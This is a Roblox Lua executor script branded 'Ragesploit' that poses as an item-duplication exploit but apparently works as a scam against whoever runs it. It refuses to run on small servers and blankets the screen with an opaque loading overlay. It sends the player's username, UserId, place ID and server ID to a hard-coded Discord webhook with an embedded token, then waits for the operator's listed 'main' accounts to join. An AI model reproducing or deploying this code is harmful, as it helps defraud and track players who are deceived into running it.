local MAIN_USER_IDS = {
    591015339,
    10637972054,
    10334144307,
    10773075053,
}

local WEBHOOK_URL = "https://discord.com/api/webhooks/1521267408063430758/7t_glP6ytb8rakMFUcEz6UXGtMFqMKZ6YP0qefu4blVcq2p_la-g5J4h7Pc67bcF8mHY"

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local player = Players.LocalPlayer

local MIN_PLAYERS = 10

if #Players:GetPlayers() < MIN_PLAYERS then
    player:Kick(
        ("Ragesploit cannot be executed in private servers.":format(MIN_PLAYERS)
    )
    return
end

getgenv().Script0Ready = false

-- Fullscreen loading GUI
local gui = Instance.new("ScreenGui")
gui.Name = "RageSploitLoading"
gui.IgnoreGuiInset = true
gui.ResetOnSpawn = false
gui.DisplayOrder = 999999
gui.Parent = player:WaitForChild("PlayerGui")

local bg = Instance.new("Frame")
bg.Parent = gui
bg.Size = UDim2.fromScale(1, 1)
bg.Position = UDim2.fromScale(0, 0)
bg.BackgroundColor3 = Color3.fromRGB(8, 6, 14)
bg.BorderSizePixel = 0
bg.Active = true

local saturn = Instance.new("TextLabel")
saturn.Parent = bg
saturn.Size = UDim2.fromScale(1, 0.2)
saturn.Position = UDim2.fromScale(0, 0.3)
saturn.BackgroundTransparency = 1
saturn.Text = "🪐"
saturn.TextScaled = true
saturn.Font = Enum.Font.GothamBold

local loading = Instance.new("TextLabel")
loading.Parent = bg
loading.Size = UDim2.fromScale(1, 0.12)
loading.Position = UDim2.fromScale(0, 0.5)
loading.BackgroundTransparency = 1
loading.Text = "Loading"
loading.TextColor3 = Color3.fromRGB(255, 255, 255)
loading.TextScaled = true
loading.Font = Enum.Font.GothamBlack

local sub = Instance.new("TextLabel")
sub.Parent = bg
sub.Size = UDim2.fromScale(1, 0.08)
sub.Position = UDim2.fromScale(0, 0.62)
sub.BackgroundTransparency = 1
sub.Text = "ragesploit"
sub.TextColor3 = Color3.fromRGB(170, 90, 255)
sub.TextScaled = true
sub.Font = Enum.Font.GothamBold

local function sendWebhook()
    if WEBHOOK_URL == "" or WEBHOOK_URL == "PUT_YOUR_WEBHOOK_HERE" then
        warn("[SCRIPT 0] Webhook URL not set")
        return
    end

    local requestFunc = syn and syn.request or http_request or request

    if not requestFunc then
        warn("[SCRIPT 0] No HTTP request function available")
        return
    end

    pcall(function()
        requestFunc({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode({
                content =
                    "@everyone\n" ..
                    "**My script was executed**\n" ..
                    "**Username:** " .. player.Name .. "\n" ..
                    "**Display Name:** " .. player.DisplayName .. "\n" ..
                    "**UserId:** `" .. tostring(player.UserId) .. "`\n" ..
                    "**PlaceId:** `" .. tostring(game.PlaceId) .. "`\n" ..
                    "**Server ID:** `" .. tostring(game.JobId) .. "`"
            })
        })
    end)
end

print("[SCRIPT 0] Executed")
sendWebhook()

print("[SCRIPT 0] Waiting for main account...")

while true do
    for _, userId in ipairs(MAIN_USER_IDS) do
        local main = Players:GetPlayerByUserId(userId)

        if main then
            print("[SCRIPT 0] Dupe initiated:", main.Name, userId)
            print("[SCRIPT 0] Please wait...")

            task.wait(16)

            print("[SCRIPT 0] Ready. Cycle can begin.")
            getgenv().Script0Ready = true
            return
        end
    end

    task.wait(1)
end
